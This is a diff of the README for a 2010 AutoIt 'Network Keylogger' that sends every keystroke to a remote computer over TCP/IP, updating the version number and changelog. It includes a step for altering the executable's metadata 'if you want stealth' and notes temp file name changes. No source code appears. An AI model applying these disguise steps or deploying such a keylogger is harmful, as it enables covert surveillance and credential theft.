@@ -1,5 +1,5 @@
-Network Keylogger v1.0.0.1 - Sends every key pressed in a computer to another computer, via TCP/IP.
-Network Keylogger Server v1.0.0.1 - Server program for Network Keylogger
+Network Keylogger v1.0.0.2 - Sends every key pressed in a computer to another computer, via TCP/IP.
+Network Keylogger Server v1.0.0.2 - Server program for Network Keylogger
 Copyright © 2010 VittGam - NetworkKeylogger@VittGam.net
 
 ================================
@@ -21,14 +21,14 @@ Copyright © 2010 VittGam - NetworkKeylogger@VittGam.net
 5.	Change these parameters if you want stealth:
 
 	#AutoIt3Wrapper_icon=vittgam.ico
-	#AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0.0.1 by VittGam
+	#AutoIt3Wrapper_Res_Comment=Network Keylogger v1.0.0.2 by VittGam
 	#AutoIt3Wrapper_Res_Description=Network Keylogger
-	#AutoIt3Wrapper_Res_Fileversion=1.0.0.1
+	#AutoIt3Wrapper_Res_Fileversion=1.0.0.2
 	#AutoIt3Wrapper_Res_LegalCopyright=Copyright © 2010 VittGam
 	#AutoIt3Wrapper_Res_Field=InternalName|network_keylogger
 	#AutoIt3Wrapper_Res_Field=ProductName|Network Keylogger
 	#AutoIt3Wrapper_Res_Field=CompanyName|VittGam (www.VittGam.net)
-	#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.1
+	#AutoIt3Wrapper_Res_Field=ProductVersion|1.0.0.2
 	#AutoIt3Wrapper_Res_Field=OriginalFilename|network_keylogger.exe
 
 6.	Save the script.
@@ -63,6 +63,11 @@ Copyright © 2010 VittGam - NetworkKeylogger@VittGam.net
 ================================
 ========== Changelog: ==========
 ================================
+
+Version 1.0.0.2 - 2010/06/16
+* The keylog temporary file name changes at program startup
+* Better temporary file management between sessions
+* Some minor changes
 
 Version 1.0.0.1 - 2010/06/15
 * Added README.txt and renamed gpl.txt to LICENSE.txt
